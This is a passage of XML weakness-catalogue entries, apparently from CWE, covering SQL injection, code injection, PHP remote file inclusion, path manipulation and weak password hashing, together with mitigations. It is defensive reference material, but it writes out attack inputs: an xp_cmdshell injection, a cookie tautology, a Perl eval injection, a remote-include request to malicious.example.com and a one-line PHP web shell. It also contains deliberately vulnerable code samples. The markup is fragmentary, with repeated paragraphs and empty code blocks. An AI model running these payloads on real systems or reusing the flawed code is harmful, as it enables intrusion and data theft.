                  </xhtml:ul>
               </Body_Text>
               <Body_Text>Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.</Body_Text>
               <Body_Text>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they do not protect against many others. For example, the following PL/SQL procedure is vulnerable to the same SQL injection attack shown in the first example.</Body_Text>
               <Example_Code Nature="bad">
                  <xhtml:div>procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2)<xhtml:br/>is open itm_cv for<xhtml:br/>' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND itemname = ' || itm || ';<xhtml:br/>end get_item;</xhtml:div>
               </Example_Code>
               <Body_Text>Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>MS SQL has a built in function that enables shell command execution. An SQL injection in such a context could be disastrous. For example, a query of the form:</Intro_Text>
               <Example_Code Nature="bad">
                  <xhtml:div>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE</xhtml:div>
               </Example_Code>
               <Body_Text>Where $user_input is taken from an untrusted source.</Body_Text>
               <Body_Text>If the user provides the string:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>'; exec master..xp_cmdshell 'dir' --</xhtml:div>
               </Example_Code>
               <Body_Text>The query will take the following form:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICE</xhtml:div>
               </Example_Code>
               <Body_Text>Now, this query can be broken down into:</Body_Text>
               <Body_Text>
                  <xhtml:ol>
                     <xhtml:li>
                        <xhtml:div>a first SQL query: SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='';</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>a second SQL query, which executes the dir command in the shell: exec master..xp_cmdshell 'dir'</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>an MS SQL comment: --' ORDER BY PRICE</xhtml:div>
                     </xhtml:li>
                  </xhtml:ol>
               </Body_Text>
               <Body_Text>As can be seen, the malicious input changes the semantics of the query into a query, a shell command execution and a comment.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code intends to print a message summary given the message ID.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$id = $_COOKIE["mid"];<xhtml:br/>mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer may have skipped any input validation on $id under the assumption that attackers cannot modify the cookie. However, this is easy to do with custom client code or even in the web browser.</Body_Text>
               <Body_Text>While $id is wrapped in single quotes in the call to mysql_query(), an attacker could simply change the incoming mid cookie to:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>1432' or '1' = '1</xhtml:div>
               </Example_Code>
               <Body_Text>This would produce the resulting query:</Body_Text>

                  <xhtml:div>SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'</xhtml:div>
               </Example_Code>
               <Body_Text>Not only will this retrieve message number 1432, it will retrieve all other messages.</Body_Text>
               <Body_Text>In this case, the programmer could apply a simple modification to the code to eliminate the SQL injection:</Body_Text>
               <Example_Code Nature="good" Language="PHP">
                  <xhtml:div>$id = intval($_COOKIE["mid"]);<xhtml:br/>mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");</xhtml:div>
               </Example_Code>
               <Body_Text>However, if this code is intended to support multiple users with different message boxes, the code might also need an access control check (CWE-285) to ensure that the application user has the permission to see that message.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example attempts to take a last name provided by a user and enter it into a database.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">

               </Example_Code>
               <Body_Text>While the programmer applies a whitelist to the user input, it has shortcomings. First of all, the user is still allowed to provide hyphens which are used as comment structures in SQL. If a user specifies -- then the remainder of the statement will be treated as a comment, which may bypass security logic. Furthermore, the whitelist permits the apostrophe which is also a data / command separator in SQL. If a user supplies a name with an apostrophe, they may be able to alter the structure of the whole statement and even change control flow of the program, possibly accessing or modifying confidential information. In this situation, both the hyphen and apostrophe are legitimate characters for a last name and permitting them is required. Instead, a programmer may want to use a prepared statement or apply an encoding routine to the input to prevent any data / directive misinterpretations.</Body_Text>

               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

      <Weakness ID="916" Name="Use of Password Hash With Insufficient Computational Effort" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software generates a hash for a password, but it uses a scheme that does not provide a sufficient level of computational effort that would make password cracking attacks infeasible or expensive.</Description>
         <Extended_Description>
            <xhtml:p>Many password storage mechanisms compute a hash and store the hash, instead of storing the original password in plaintext. In this design, authentication involves accepting an incoming password, computing its hash, and comparing it to the stored hash.</xhtml:p>
            <xhtml:p>Many hash algorithms are designed to execute quickly with minimal overhead, even cryptographic hashes. However, this efficiency is a problem for password storage, because it can reduce an attacker's workload for brute-force password cracking. If an attacker can obtain the hashes through some other method (such as SQL injection on a database that stores hashes), then the attacker can store the hashes offline and use various techniques to crack the passwords by computing hashes efficiently. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing (such as cloud computing) and GPU, ASIC, or FPGA hardware. In such a scenario, an efficient hash algorithm helps the attacker.</xhtml:p>
            <xhtml:p>There are several properties of a hash scheme that are relevant to its strength against an offline, massively-parallel attack:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>

               <Description>
                  <xhtml:p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.</xhtml:p>
                  <xhtml:p>Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.</xhtml:p>
                  <xhtml:p>Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.</xhtml:p>

      <Weakness ID="921" Name="Storage of Sensitive Data in a Mechanism without Access Control" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software stores sensitive information in a file system or device that does not have built-in access control.</Description>
         <Extended_Description>
            <xhtml:p>While many modern file systems or devices utilize some form of access control in order to restrict access to data, not all storage mechanisms have this capability. For example, memory cards, floppy disks, CDs, and USB devices are typically made accessible to any user within the system. This can become a problem when sensitive data is stored in these mechanisms in a multi-user environment, because anybody on the system can read or write this data.</xhtml:p>
            <xhtml:p>On Android devices, external storage is typically globally readable and writable by other applications on the device. External storage may also be easily accessible through the mobile device's USB connection or physically accessible through the device's memory card port.</xhtml:p>

      <Weakness ID="939" Name="Improper Authorization in Handler for Custom URL Scheme" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software uses a handler for a custom URL scheme, but it does not properly restrict which actors can invoke the handler using the scheme.</Description>
         <Extended_Description>Mobile platforms and other architectures allow the use of custom URL schemes to facilitate communication between applications. In the case of iOS, this is the only method to do inter-application communication. The implementation is at the developer's discretion which may open security flaws in the application. An example could be potentially dangerous functionality such as modifying files through a custom URL scheme.</Extended_Description>

      </Weakness>
      <Weakness ID="94" Name="Improper Control of Generation of Code ('Code Injection')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.</Description>
         <Extended_Description>
            <xhtml:p>When software allows a user's input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the software. Such an alteration could lead to arbitrary code execution.</xhtml:p>
            <xhtml:p>Injection problems encompass a wide variety of issues -- all mitigated in very different ways. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.</xhtml:p>

                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>To reduce the likelihood of code injection, use stringent whitelists that limit which constructs are allowed. If you are dynamically constructing code that invokes a function, then verifying that the input is alphanumeric might be insufficient. An attacker might still be able to reference a dangerous function that you did not intend to allow, such as system(), exec(), or exit().</xhtml:p>

               <Body_Text>The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as: add_key(",","); system("/bin/ls"); This would produce the following string in handleConfigAction(): config_file_add_key(",","); system("/bin/ls"); Any arbitrary Perl code could be added after the attacker has "closed off" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the "_key(\$fname, \$key, \$val)" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated.</Body_Text>

      <Weakness ID="941" Name="Incorrectly Specified Destination in a Communication Channel" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software creates a communication channel to initiate an outgoing request to an actor, but it does not correctly specify the intended destination for that actor.</Description>
         <Extended_Description>
            <xhtml:p>Attackers at the destination may be able to spoof trusted servers to steal data or cause a denial of service.</xhtml:p>
            <xhtml:p>There are at least two distinct weaknesses that can cause the software to communicate with an unintended destination:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>If the software allows an attacker to control which destination is specified, then the attacker can cause it to connect to an untrusted or malicious destination. For example, because UDP is a connectionless protocol, UDP packets can be spoofed by specifying a false source address in the packet; when the server receives the packet and sends a reply, it will specify a destination by using the source of the incoming packet - i.e., the false source. The server can then be tricked into sending traffic to the wrong host, which is effective for hiding the real source of an attack and for conducting a distributed denial of service (DDoS). As another example, server-side request forgery (SSRF) and XML External Entity (XXE) can be used to trick a server into making outgoing requests to hosts that cannot be directly accessed by the attacker due to firewall restrictions.</xhtml:li>
                  <xhtml:li>If the software incorrectly specifies the destination, then an attacker who can control this destination might be able to spoof trusted servers. While the most common occurrence is likely due to misconfiguration by an administrator, this can be resultant from other weaknesses. For example, the software might incorrectly parse an e-mail or IP address and send sensitive data to an unintended destination. As another example, an Android application may use a "sticky broadcast" to communicate with a receiver for a particular application, but since sticky broadcasts can be processed by *any* receiver, this can allow a malicious application to access restricted data that was only intended for a different application.</xhtml:li>

      <Weakness ID="942" Name="Overly Permissive Cross-domain Whitelist" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software uses a cross-domain policy file that includes domains that should not be trusted.</Description>
         <Extended_Description>
            <xhtml:p>A cross-domain policy file ("crossdomain.xml" in Flash and "clientaccesspolicy.xml" in Silverlight) defines a whitelist of domains from which a server is allowed to make cross-domain requests. When making a cross-domain request, the Flash or Silverlight client will first look for the policy file on the target server. If it is found, and the domain hosting the application is explicitly allowed to make requests, the request is made.</xhtml:p>
            <xhtml:p>Therefore, if a cross-domain policy file includes domains that should not be trusted, such as when using wildcards, then the application could be attacked by these untrusted domains.</xhtml:p>
            <xhtml:p>An overly permissive policy file allows many of the same attacks seen in Cross-Site Scripting (CWE-79). Once the user has executed a malicious Flash or Silverlight application, they are vulnerable to a variety of attacks. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site.</xhtml:p>
            <xhtml:p>In many cases, the attack can be launched without the victim even being aware of it.</xhtml:p>

      <Weakness ID="943" Name="Improper Neutralization of Special Elements in Data Query Logic" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The application generates a query intended to access or manipulate data in a data store such as a database, but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query.</Description>
         <Extended_Description>
            <xhtml:p>Depending on the capabilities of the query language, an attacker could inject additional logic into the query to:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>Modify the intended selection criteria, thus changing which data entities (e.g., records) are returned, modified, or otherwise manipulated</xhtml:li>
                  <xhtml:li>Append additional commands to the query</xhtml:li>
                  <xhtml:li>Return more entities than intended</xhtml:li>
                  <xhtml:li>Return fewer entities than intended</xhtml:li>
                  <xhtml:li>Cause entities to be sorted in an unexpected way</xhtml:li>
               </xhtml:ul>
            </xhtml:div>
            <xhtml:p>The ability to execute additional commands or change which entities are returned has obvious risks. But when the application logic depends on the order or number of entities, this can also lead to vulnerabilities. For example, if the application query expects to return only one entity that specifies an administrative user, but an attacker can change which entities are returned, this could cause the logic to return information for a regular user and incorrectly assume that the user has administrative privileges.</xhtml:p>
            <xhtml:p>While this weakness is most commonly associated with SQL injection, there are many other query languages that are also subject to injection attacks, including HTSQL, LDAP, DQL, XQuery, Xpath, and "NoSQL" languages.</xhtml:p>

         <Notes>
            <Note Type="Relationship">It could be argued that data query languages are effectively a command language - albeit with a limited set of commands - and thus any query-language injection issue could be treated as a child of CWE-74. However, CWE-943 is intended to better organize query-oriented issues to separate them from fully-functioning programming languages, and also to provide a more precise identifier for the many query languages that do not have their own CWE identifier.</Note>

               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.</xhtml:p>
                  <xhtml:p>Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.</xhtml:p>

               <Body_Text>The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>add_key(",","); system("/bin/ls");</xhtml:div>
               </Example_Code>
               <Body_Text>This would produce the following string in handleConfigAction():</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>config_file_add_key(",","); system("/bin/ls");</xhtml:div>
               </Example_Code>
               <Body_Text>Any arbitrary Perl code could be added after the attacker has "closed off" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the "_key(\$fname, \$key, \$val)" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated.</Body_Text>

               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

      <Weakness ID="98" Name="Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in "require," "include," or similar functions.</Description>
         <Extended_Description>In certain versions and configurations of PHP, this can allow an attacker to specify a URL to a remote location from which the software will obtain the code to execute. In other cases in association with path traversal, the attacker can specify a local file that may contain executable statements that can be parsed by PHP.</Extended_Description>

               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>

               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>

               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>

               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>

               <Description>
                  <xhtml:p>Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.</xhtml:p>
                  <xhtml:p>This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.</xhtml:p>

Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.</xhtml:p>

               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>

               <Description>
                  <xhtml:p>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</xhtml:p>
                  <xhtml:p>Often, programmers do not protect direct access to files intended only to be included by core programs. These include files may assume that critical variables have already been initialized by the calling program. As a result, the use of register_globals combined with the ability to directly access the include file may allow attackers to conduct file inclusion attacks. This remains an extremely common pattern as of 2009.</xhtml:p>

         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code, victim.php, attempts to include a function contained in a separate PHP page on the server. It builds the path to the file by using the supplied 'module_name' parameter and appending the string '/function.php' to it.</Intro_Text>

               </Example_Code>
               <Body_Text>The problem with the above code is that the value of $dir is not restricted in any way, and a malicious user could manipulate the 'module_name' parameter to force inclusion of an unanticipated file. For example, an attacker could request the above PHP page (example.php) with a 'module_name' of "http://malicious.example.com" by using the following request string:</Body_Text>
               <Example_Code Nature="attack">

               </Example_Code>
               <Body_Text>Upon receiving this request, the code would set 'module_name' to the value "http://malicious.example.com" and would attempt to include http://malicious.example.com/function.php, along with any malicious code it contains.</Body_Text>
               <Body_Text>For the sake of this example, assume that the malicious version of function.php looks like the following:</Body_Text>
               <Example_Code Nature="bad">
                  <xhtml:div>system($_GET['cmd']);</xhtml:div>
               </Example_Code>
               <Body_Text>An attacker could now go a step further in our example and provide a request string as follows:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>victim.php?module_name=http://malicious.example.com&amp;cmd=/bin/ls%20-l</xhtml:div>
               </Example_Code>
               <Body_Text>The code will attempt to include the malicious function.php file from the remote site. In turn, this file executes the command specified in the 'cmd' parameter from the query string. The end result is an attempt by tvictim.php to execute the potentially malicious command, in this case:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>/bin/ls -l</xhtml:div>
               </Example_Code>
               <Body_Text>Note that the above PHP example can be mitigated by setting allow_url_fopen to false, although this will not fully protect the code. See potential mitigations.</Body_Text>

            <Note Type="Relationship">
               <xhtml:p>This is frequently a functional consequence of other weaknesses. It is usually multi-factor with other factors (e.g. MAID), although not all inclusion bugs involve assumed-immutable data. Direct request weaknesses frequently play a role.</xhtml:p>
               <xhtml:p>Can overlap directory traversal in local inclusion problems.</xhtml:p>
            </Note>
            <Note Type="Research Gap">Under-researched and under-reported. Other interpreted languages with "require" and "include" functionality could also product vulnerable applications, but as of 2007, PHP has been the focus. Any web-accessible language that uses executable file extensions is likely to have this type of issue, such as ASP, since .asp extensions are typically executable. Languages such as Perl are less likely to exhibit these problems because the .pl extension isn't always configured to be executable by the web server.</Note>

                  <xhtml:li>An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used.</xhtml:li>
                  <xhtml:li>By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server.</xhtml:li>

               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as "../../tomcat/conf/server.xml", which causes the application to delete one of its own configuration files.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String rName = request.getParameter("reportName");<xhtml:br/>File rFile = new File("/usr/local/apfr/reports/" + rName);<xhtml:br/>...<xhtml:br/>rFile.delete();</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code uses input from the command line to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can create soft links to the file, they can use the program to read the first part of any file on the system.</Intro_Text>
               <Example_Code Nature="bad" Language="C++">
                  <xhtml:div>ifstream ifs(argv[0]);<xhtml:br/>string s;<xhtml:br/>ifs &gt;&gt; s;<xhtml:br/>cout &lt;&lt; s;</xhtml:div>
               </Example_Code>
               <Body_Text>The kind of resource the data affects indicates the kind of content that may be dangerous. For example, data containing special characters like period, slash, and backslash, are risky when used in methods that interact with the file system. (Resource injection, when it is related to file system resources, sometimes goes by the name "path manipulation.") Similarly, data that contains URLs and URIs is risky for functions that create remote connections.</Body_Text>

         <Notes>
            <Note Type="Relationship">Resource injection that involves resources stored on the filesystem goes by the name path manipulation (CWE-73).</Note>
            <Note Type="Maintenance">The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 "Resource Injection," as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the "identifier used to access a system resource" such as a file name or port number, yet it explicitly states that the "resource injection" term does not apply to "path manipulation," which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer.</Note>
            <Note Type="Other">
               <xhtml:p>A resource injection issue occurs when the following two conditions are met:</xhtml:p>
               <xhtml:div style="margin-left:10px;">
                  <xhtml:ol>
                     <xhtml:li>An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used.</xhtml:li>
                     <xhtml:li>By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server.</xhtml:li>
                  </xhtml:ol>
               </xhtml:div>
               <xhtml:p>Note: Resource injection that involves resources stored on the filesystem goes by the name path manipulation and is reported in a separate category. See the path manipulation description for further details of this vulnerability.</xhtml:p>

         <Summary>Weaknesses in this category are related to the design and architecture of a system's data integrity components. Frequently these deal with ensuring integrity of data, such as messages, resource files, deployment files, and configuration files. The weaknesses in this category could lead to a degradation of data integrity quality if they are not addressed when designing or implementing a secure architecture.</Summary>

      <View ID="1008" Name="Architectural Concepts" Type="Graph" Status="Incomplete">
